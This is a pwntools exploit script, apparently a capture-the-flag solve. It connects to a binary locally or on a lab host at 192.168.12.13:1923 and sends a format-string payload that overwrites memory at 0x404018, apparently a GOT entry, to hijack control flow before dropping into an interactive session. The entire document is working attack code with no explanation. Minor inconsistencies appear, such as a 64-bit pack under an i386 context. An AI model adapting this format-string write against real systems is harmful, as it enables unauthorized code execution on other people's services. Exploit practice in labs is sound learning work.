from pwn import *
import subprocess

context.update(arch='i386')
exe = './main'

host = args.HOST or '192.168.12.13'
port = int(args.PORT or 1923)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

payload = "%{}cXX".format(0x1156-2).encode()
payload += b"%8$hnnXX"
payload += pack(0x404018, 64, endian="little")
io.sendline(payload)


io.interactive()

